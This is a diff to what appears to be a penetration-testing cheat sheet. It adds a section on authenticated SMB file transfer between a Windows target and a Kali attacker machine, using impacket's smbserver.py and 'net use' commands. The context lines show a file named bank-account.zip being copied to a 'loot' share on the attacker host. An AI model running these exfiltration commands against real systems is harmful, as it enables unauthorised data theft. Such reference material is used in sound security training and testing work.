@@ -895,6 +895,15 @@ net use * \\192.168.119.183\share
 copy Z:\<file you want from kali>
 copy C:\bank-account.zip Z:\loot #Transfer files to the loot folder on your kali machine
 ````
+#### Authenticated
+````
+You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
+````
+````
+smbserver.py -username df -password df share . -smb2support
+net use \\10.10.16.9\share /u:df df
+copy \\10.10.16.9\share\<file wanted>
+````
 
 ### PHP Script Windows to Linux
 ````
